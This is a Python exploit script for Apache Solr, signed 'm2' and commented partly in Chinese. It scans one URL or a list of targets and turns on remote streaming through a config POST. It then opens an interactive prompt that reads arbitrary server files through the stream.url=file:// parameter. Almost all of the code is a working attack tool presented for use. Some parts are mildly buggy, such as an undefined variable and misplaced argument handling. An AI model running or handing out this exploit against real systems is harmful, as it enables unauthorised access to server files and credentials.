import requests
import re
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import random


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]

#随机ua
def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua

#poc
def get_core(url):
	url = parse.urlparse(url)
	url1 = url.scheme + '://' + url.netloc
	vuln_url = url.scheme + '://' + url.netloc + '/solr/admin/cores?indexInfo=false&wt=json'
	try:
		res = requests.get(vuln_url,timeout=15,verify=False)
		if res.status_code==200 and "status" in res.text:
			resp=res.json()
			core_name=(list(resp.get('status'))[0])
			return core_name
		else:
			print("\033[31m[-]%s is not vuln\033[0m" %url1)
	except Exception as e:
		print("\033[31m[-]%s is timeout\033[0m" %url1)


def check_vuln(url):
	core_name=get_core(url)
	if core_name != None:
		url = parse.urlparse(url)
		url2=url.scheme + '://' + url.netloc + '/solr/' + core_name + '/config'
		headers = {
			'User-Agent': get_ua(),
			"Content-type":"application/json",
		}
		data='{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
		# data=base64.b64encode("eyJzZXQtcHJvcGVydHkiOnsicmVxdWVzdERpc3BhdGNoZXIucmVxdWVzdFBhcnNlcnMuZW5hYmxlUmVtb3RlU3RyZWFtaW5nIjp0cnVlfX0=")
		try:
			res2 = requests.post(url2,headers=headers,data=data,timeout=15,verify=False)
			if res2.status_code==200 and "experimental" in res2.text:
				print("\033[32m[+]%s is vuln\033[0m" %url2)
				return 1
			else:
				print("\033[31m[-]%s is not vuln\033[0m" %url1)
		except Exception as e:
			print("\033[31m[-]%s is timeout\033[0m" %url2)


#cmdshell
def cmdshell(url):
	core_name=get_core(url)
	if check_vuln(url) == 1:
		url = parse.urlparse(url)
		url1 = url.scheme + '://' + url.netloc + '/solr/' + core_name + '/debug/dump?param=ContentStreams'
		while 1:
			cmd = input("\033[35mCmd: \033[0m")
			if cmd =="exit":
				sys.exit(0)
			else:
				headers = {
       					"Content-Type": "application/x-www-form-urlencoded"
    				}
				data="stream.url=file://"+ cmd
				try:
					res = requests.post(url1,headers=headers,data=data,timeout=15,verify=False)
					if res.status_code==200:
						resp=res.json()
						text=(list(resp.get('streams'))[0]['stream'])
						print("\033[32m%s\033[0m" %text,end='')
					else:
						print("\033[31m[-]%s request flase!\033[0m" %url1)

				except Exception as e:
					print("\033[31m[-]%s is timeout!\033[0m" %url1)


if __name__ == '__main__':
	show = r'''

	  ___                   _                      _       __ _ _                         _ 
	 / _ \                 | |                    | |     / _(_) |                       | |
	/ /_\ \_ __   __ _  ___| |__   ___   ___  ___ | |_ __| |_ _| | ___ _ __ ___  __ _  __| |
	|  _  | '_ \ / _` |/ __| '_ \ / _ \ / __|/ _ \| | '__|  _| | |/ _ \ '__/ _ \/ _` |/ _` |
	| | | | |_) | (_| | (__| | | |  __/ \__ \ (_) | | |  | | | | |  __/ | |  __/ (_| | (_| |
	\_| |_/ .__/ \__,_|\___|_| |_|\___| |___/\___/|_|_|  |_| |_|_|\___|_|  \___|\__,_|\__,_|
	      | |                       ______          ______                                  
	      |_|                      |______|        |______|                                 
	                                                                    
                              	 				Apache_solr_fileread_exp By m2
	'''
	print(show + '\n')
	arg=ArgumentParser(description='Apache_solr_fileread_exp By m2')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="Target URL; Example:url.txt")
	arg.add_argument("-c",
					"--cmd",
					help="Target URL; Example:http://ip:port")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	cmd=args.cmd
	print('[*]任务开始...')
	if url != None and cmd == None and filename == None:
		check_vuln(url)
	elif url == None and cmd == None and filename != None:
		start=time()
		for i in open(filename):
			i=i.replace('\n','')
			check_vuln(i)
		end=time()
		print('任务完成，用时%d' %(end-start))
	elif url == None and cmd != None and filename == None:
		cmdshell(cmd)
